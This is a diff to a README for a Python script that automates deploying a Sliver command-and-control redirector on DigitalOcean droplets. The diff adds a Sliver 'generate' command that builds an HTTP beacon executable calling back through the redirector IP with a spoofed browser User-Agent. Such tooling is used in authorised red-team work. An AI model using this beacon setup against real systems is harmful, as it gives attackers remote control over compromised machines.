@@ -1,4 +1,4 @@
-# DigitalOcean C2 Infrastructure Automation Script (run.py)
+# DigitalOcean C2 Redirector Automation Script
 
 This Python script provides a command-line interface to automate the deployment of a redirector server for sliver, using DigitalOcean droplets.
 
@@ -36,3 +36,8 @@ python redirectorC2setup.py YOUR_API_KEY keys list
 which will return a list of SSH keys and their corresponding IDs)
 
 The command will take aroind 5 minutes to run and return the redirector ip.
+
+Once done, to create a very basic beacon in sliver that uses the redirector, run 
+```bash
+generate --http  "https://REDIRECTOR_IP/,User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0" --save /root/sliver-beacon.exe
+```
